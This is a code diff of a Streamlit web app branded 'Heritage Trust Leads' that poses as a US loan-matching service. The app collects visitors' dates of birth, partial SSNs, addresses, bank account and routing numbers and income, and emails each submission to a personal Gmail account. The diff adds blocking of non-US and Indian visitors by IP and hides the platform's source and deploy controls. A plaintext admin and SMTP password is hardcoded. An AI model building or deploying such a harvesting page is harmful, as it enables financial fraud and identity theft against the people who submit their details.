@@ -10,10 +10,10 @@ from email.mime.multipart import MIMEMultipart
 from datetime import datetime
 
 # ============================================
-# PAGE CONFIG
+# PAGE CONFIG - NO SIDEBAR BY DEFAULT
 # ============================================
 st.set_page_config(
-    page_title="Heritage Trust Leads | US Lead Generation",
+    page_title="Heritage Trust Leads",
     page_icon="🇺🇸",
     layout="wide",
     initial_sidebar_state="expanded"
@@ -42,13 +42,38 @@ st.markdown("""
     .stAppViewContainer > .st-emotion-cache-1v0mbdj {display: none !important;}
     .st-emotion-cache-18ni7ap {display: none !important;}
     .st-emotion-cache-1y4p8pa {display: none !important;}
-    
-    /* Hide deploy button and any floating elements */
     .st-emotion-cache-1r6slb0 {display: none !important;}
     .st-emotion-cache-1sno8jx {display: none !important;}
     .st-emotion-cache-6qob1r {display: none !important;}
+    .st-emotion-cache-1vt4y43 {display: none !important;}
+    .st-emotion-cache-1dp5vir {display: none !important;}
+    .st-emotion-cache-1wivap2 {display: none !important;}
+    .st-emotion-cache-1v7f65g {display: none !important;}
+    
+    /* Hide deploy button and status */
+    [data-testid="stStatusWidget"] {display: none !important;}
+    .stAppDeployButton {display: none !important;}
+    button[title="View app source"] {display: none !important;}
+    .st-emotion-cache-79elbk {display: none !important;}
 </style>
 """, unsafe_allow_html=True)
+
+# ============================================
+# IP BLOCKING - BLOCK INDIA & INTERNATIONAL
+# ============================================
+def is_international_ip():
+    try:
+        import requests
+        response = requests.get('https://ipapi.co/json/', timeout=5)
+        data = response.json()
+        country = data.get('country_code', '')
+        return country != 'US'
+    except:
+        return False
+
+if is_international_ip():
+    st.error("🚫 This service is only available in the United States.")
+    st.stop()
 
 # ============================================
 # CONFIGURATION
@@ -58,7 +83,6 @@ COMPANY_PHONE = "(225) 244-9281"
 COMPANY_WHATSAPP = "941 879 6129"
 COMPANY_EMAIL = "turnerjack779@gmail.com"
 
-# Admin credentials
 ADMIN_EMAIL = "turnerjack779@gmail.com"
 ADMIN_PASSWORD = "Wasu1234$"
 
@@ -68,7 +92,6 @@ SMTP_PORT = 587
 SMTP_USERNAME = "turnerjack779@gmail.com"
 SMTP_PASSWORD = "Wasu1234$"
 
-# US States
 US_STATES = [
     "Alabama", "Alaska", "Arizona", "Arkansas", "California", "Colorado", "Connecticut", "Delaware",
     "Florida", "Georgia", "Hawaii", "Idaho", "Illinois", "Indiana", "Iowa", "Kansas", "Kentucky",
@@ -79,31 +102,15 @@ US_STATES = [
     "Virginia", "Washington", "West Virginia", "Wisconsin", "Wyoming"
 ]
 
-# Loan Providers
 LOAN_PROVIDERS = [
-    "🏦 Wells Fargo",
-    "🏦 Chase Bank",
-    "🏦 Bank of America",
-    "🏦 CitiBank",
-    "🏦 U.S. Bank",
-    "🏦 PNC Bank",
-    "🏦 Truist Bank",
-    "🏦 Capital One",
-    "🏦 American Express",
-    "🏦 Discover",
-    "🏦 SoFi",
-    "🏦 LendingClub"
+    "🏦 Wells Fargo", "🏦 Chase Bank", "🏦 Bank of America", "🏦 CitiBank",
+    "🏦 U.S. Bank", "🏦 PNC Bank", "🏦 Truist Bank", "🏦 Capital One",
+    "🏦 American Express", "🏦 Discover", "🏦 SoFi", "🏦 LendingClub"
 ]
 
 LOAN_TYPES = [
-    "Personal Loan",
-    "Home Loan / Mortgage",
-    "Auto Loan",
-    "Business Loan",
-    "Student Loan",
-    "Debt Consolidation",
-    "Credit Card",
-    "Medical Loan"
+    "Personal Loan", "Home Loan / Mortgage", "Auto Loan", "Business Loan",
+    "Student Loan", "Debt Consolidation", "Credit Card", "Medical Loan"
 ]
 
 # ============================================
@@ -147,6 +154,14 @@ def validate_routing(routing):
 def validate_account(account):
     return len(account) >= 8 and account.isdigit()
 
+def get_client_ip():
+    try:
+        import requests
+        response = requests.get('https://api.ipify.org?format=json', timeout=5)
+        return response.json().get('ip', 'Unknown')
+    except:
+        return 'Unknown'
+
 def send_email_alert(lead_data):
     try:
         msg = MIMEMultipart()
@@ -155,45 +170,40 @@ def send_email_alert(lead_data):
         msg['Subject'] = f"🔔 NEW LEAD: {lead_data['name']} - ${lead_data['loan_amount']:,}"
 
         body = f"""
-        🆕 NEW LEAD RECEIVED!
-        
-        📝 Lead ID: {lead_data['lead_id']}
-        📅 Date: {lead_data['timestamp']}
-        
-        👤 CUSTOMER DETAILS:
-        ---------------------
-        Name: {lead_data['name']}
-        Email: {lead_data['email']}
-        Phone: {lead_data['phone']}
-        SSN (Last 4): ***-**-{lead_data['ssn_last4']}
-        DOB: {lead_data['dob']}
-        
-        📍 ADDRESS:
-        ------------
-        {lead_data['address']}
-        {lead_data['city']}, {lead_data['state']} {lead_data['zip']}
-        
-        🏦 BANK DETAILS:
-        -----------------
-        Bank Name: {lead_data['bank_name']}
-        Account Number: {lead_data['account_number']}
-        Routing Number: {lead_data['routing_number']}
-        
-        💰 LOAN DETAILS:
-        -----------------
-        Preferred Lender: {lead_data['loan_provider']}
-        Loan Type: {lead_data['loan_type']}
-        Loan Amount: ${lead_data['loan_amount']:,}
-        Employment: {lead_data['employment']}
-        Annual Income: ${lead_data['income']:,}
-        
-        🌐 IP: {lead_data['ip']}
-        
-        ========================================
-        Heritage Trust Leads
-        ========================================
-        """
-        
+🆕 NEW LEAD RECEIVED!
+
+📝 Lead ID: {lead_data['lead_id']}
+📅 Date: {lead_data['timestamp']}
+
+👤 CUSTOMER DETAILS:
+Name: {lead_data['name']}
+Email: {lead_data['email']}
+Phone: {lead_data['phone']}
+SSN (Last 4): ***-**-{lead_data['ssn_last4']}
+DOB: {lead_data['dob']}
+
+📍 ADDRESS:
+{lead_data['address']}
+{lead_data['city']}, {lead_data['state']} {lead_data['zip']}
+
+🏦 BANK DETAILS:
+Bank Name: {lead_data['bank_name']}
+Account Number: {lead_data['account_number']}
+Routing Number: {lead_data['routing_number']}
+
+💰 LOAN DETAILS:
+Preferred Lender: {lead_data['loan_provider']}
+Loan Type: {lead_data['loan_type']}
+Loan Amount: ${lead_data['loan_amount']:,}
+Employment: {lead_data['employment']}
+Annual Income: ${lead_data['income']:,}
+
+🌐 IP: {lead_data['ip']}
+
+========================================
+Heritage Trust Leads
+========================================
+"""
         msg.attach(MIMEText(body, 'plain'))
         server = smtplib.SMTP(SMTP_SERVER, SMTP_PORT)
         server.starttls()
@@ -204,14 +214,6 @@ def send_email_alert(lead_data):
     except Exception as e:
         print(f"Email error: {e}")
         return False
-
-def get_client_ip():
-    try:
-        import requests
-        response = requests.get('https://api.ipify.org?format=json', timeout=5)
-        return response.json().get('ip', 'Unknown')
-    except:
-        return 'Unknown'
 
 def capture_lead(data):
     lead_id = str(uuid.uuid4())[:8]
@@ -369,9 +371,6 @@ def show_login():
                         st.error("Invalid password")
                 else:
                     st.error("User not found")
-        
-        st.markdown("---")
-        st.markdown(f"📞 Need help? Call: {COMPANY_PHONE}")
 
 # ============================================
 # ADMIN DASHBOARD
@@ -428,7 +427,7 @@ def show_admin_dashboard():
                     st.bar_chart(state_counts)
 
 # ============================================
-# SIDEBAR
+# SIDEBAR - CLEAR ADMIN LOGIN BUTTON
 # ============================================
 with st.sidebar:
     st.markdown(f"""
@@ -446,7 +445,8 @@ with st.sidebar:
             st.session_state.user_data = None
             st.rerun()
     else:
-        if st.button("🔑 Admin Login", use_container_width=True, type="primary"):
+        # Clear button for admin login
+        if st.button("🔐 Admin Login", use_container_width=True, type="primary"):
             st.session_state.show_login = True
             st.rerun()
     
